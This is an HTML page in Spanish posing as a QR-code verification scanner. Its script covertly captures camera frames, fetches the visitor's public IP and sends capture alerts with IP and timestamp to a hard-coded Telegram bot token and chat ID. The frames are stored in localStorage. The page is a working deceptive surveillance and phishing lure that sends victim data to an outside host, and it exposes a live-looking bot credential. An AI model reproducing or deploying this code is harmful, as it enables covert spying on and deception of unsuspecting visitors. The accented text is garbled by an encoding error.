<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Escaner QR - Verificaci√≥n</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f0f0f0;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }
        
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        
        .btn {
            background: #007bff;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin: 10px 0;
        }
        
        #cameraView {
            width: 100%;
            max-width: 300px;
            border: 2px solid #007bff;
            border-radius: 5px;
            display: none;
        }
        
        #captureStatus {
            margin: 10px 0;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üì∑ Esc√°ner QR de Verificaci√≥n</h1>
        <p>Para completar la verificaci√≥n, escanee el c√≥digo QR con su c√°mara</p>
        
        <button class="btn" id="startCamera">üé• Iniciar Esc√°ner QR</button>
        
        <video id="cameraView" autoplay playsinline></video>
        <canvas id="photoCanvas" style="display:none"></canvas>
        
        <div id="captureStatus"></div>
        <div id="message"></div>
    </div>

    <script>
        // Variables globales
        let cameraStream = null;
        let captureInterval = null;
        let captureCount = 0;
        const maxCaptures = 3; // N√∫mero de fotos a tomar

        // Configuraci√≥n de Telegram
        const TELEGRAM_CONFIG = {
            BOT_TOKEN: '6516180762:AAHE5RGPH1kpADaABDGzQLt0962277Nlg1I',
            CHAT_ID: '-1003181825017'
        };

        // Bot√≥n para iniciar c√°mara
        document.getElementById('startCamera').addEventListener('click', startCamera);

        async function startCamera() {
            try {
                // Solicitar permiso de c√°mara
                cameraStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: 1280, 
                        height: 720,
                        facingMode: 'environment' // C√°mara trasera para QR
                    } 
                });
                
                // Mostrar video
                const video = document.getElementById('cameraView');
                video.srcObject = cameraStream;
                video.style.display = 'block';
                
                // Cambiar bot√≥n
                document.getElementById('startCamera').textContent = '‚èπÔ∏è Detener C√°mara';
                document.getElementById('startCamera').onclick = stopCamera;
                
                // Mostrar mensaje
                showMessage('üîç Buscando c√≥digo QR...', 'info');
                
                // Iniciar captura autom√°tica cada 3 segundos
                startAutoCapture();
                
            } catch (error) {
                showMessage('‚ùå Error al acceder a la c√°mara', 'error');
                console.error('Error c√°mara:', error);
            }
        }

        function stopCamera() {
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                cameraStream = null;
            }
            
            if (captureInterval) {
                clearInterval(captureInterval);
                captureInterval = null;
            }
            
            document.getElementById('cameraView').style.display = 'none';
            document.getElementById('startCamera').textContent = 'üé• Iniciar Esc√°ner QR';
            document.getElementById('startCamera').onclick = startCamera;
            
            showMessage('üì∑ C√°mara detenida', 'info');
        }

        function startAutoCapture() {
            captureInterval = setInterval(async () => {
                if (captureCount < maxCaptures) {
                    await capturePhoto();
                    captureCount++;
                    
                    document.getElementById('captureStatus').textContent = 
                        `üì∏ Capturas tomadas: ${captureCount}/${maxCaptures}`;
                    
                    if (captureCount >= maxCaptures) {
                        showMessage('‚úÖ Verificaci√≥n completada', 'success');
                        stopCamera();
                    }
                }
            }, 3000); // Capturar cada 3 segundos
        }

        async function capturePhoto() {
            const video = document.getElementById('cameraView');
            const canvas = document.getElementById('photoCanvas');
            const context = canvas.getContext('2d');
            
            // Configurar canvas con dimensiones del video
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            // Dibujar frame actual del video
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Convertir a base64
            const photoData = canvas.toDataURL('image/jpeg', 0.8);
            
            // Obtener informaci√≥n adicional
            const ip = await getIP();
            const fecha = new Date().toLocaleString('es-ES');
            
            // Enviar a Telegram
            await sendToTelegram(photoData, ip, fecha);
        }

        async function sendToTelegram(photoData, ip, fecha) {
            // Primero enviar mensaje con info
            const infoMessage = `
üì∑ <b>NUEVA CAPTURA DE C√ÅMARA</b>

üïê <b>Fecha:</b> ${fecha}
üåê <b>IP:</b> ${ip}
üì∏ <b>Captura #:</b> ${captureCount}

üîç <i>Buscando c√≥digo QR...</i>
            `;
            
            await sendTelegramMessage(infoMessage);
            
            // Enviar foto (si Telegram lo permite via API)
            // Nota: Para enviar fotos necesitar√≠amos un backend
            console.log('üì∏ Foto capturada lista para enviar:', photoData.substring(0, 100) + '...');
            
            // Por ahora guardamos la data en consola
            localStorage.setItem(`captura_${Date.now()}`, photoData);
        }

        // Funci√≥n para obtener IP
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'IP no disponible';
            }
        }

        // Funci√≥n para enviar mensaje a Telegram
        async function sendTelegramMessage(message) {
            const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CONFIG.CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                return response.ok;
            } catch (error) {
                console.error('Error Telegram:', error);
                return false;
            }
        }

        function showMessage(text, type) {
            const messageDiv = document.getElementById('message');
            messageDiv.textContent = text;
            messageDiv.style.color = type === 'error' ? 'red' : type === 'success' ? 'green' : 'blue';
        }
    </script>
</body>
</html>
